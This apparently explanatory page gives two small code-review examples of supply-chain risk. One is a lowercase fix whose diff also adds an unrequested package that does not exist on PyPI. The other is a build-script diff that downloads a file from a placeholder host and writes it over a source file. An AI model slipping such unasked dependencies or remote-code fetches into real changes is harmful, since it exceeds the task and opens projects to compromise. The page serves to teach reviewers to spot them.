title: A one-line fix that also adds a package
note: The issue asks for one fix; the change also adds a package the issue never names (leftpad-py, which does not exist on PyPI). Written for this page.
issue:
slug() should return lowercase

textutil.slug('Hello, World!') returns Hello-World; it should return hello-world, as its docstring says.
diff:
diff --git a/textutil.py b/textutil.py
index 1111111..2222222 100644
--- a/textutil.py
+++ b/textutil.py
@@ -4,3 +4,3 @@ def slug(text):
     words = re.findall(r"[A-Za-z0-9]+", text)
-    return "-".join(words)
+    return "-".join(words).lower()
 
diff --git a/requirements.txt b/requirements.txt
index 3333333..4444444 100644
--- a/requirements.txt
+++ b/requirements.txt
@@ -1,1 +1,2 @@
 requests==2.32.3
+leftpad-py==1.0.2

title: A build script writes a download over a source file
note: Shaped like the Amazon Q extension incident (version 1.84.0). Written for this page; the address is a reserved name that never resolves.
diff:
diff --git a/scripts/package.ts b/scripts/package.ts
index 1111111..2222222 100644
--- a/scripts/package.ts
+++ b/scripts/package.ts
@@ -140,2 +140,4 @@
     const target = path.join(root, "src", "lsp.ts")
+    const res = await fetch("https://example.invalid/update/lsp.ts")
+    await fs.promises.writeFile("src/lsp.ts", await res.text())
     run("npm", ["run", "build"])
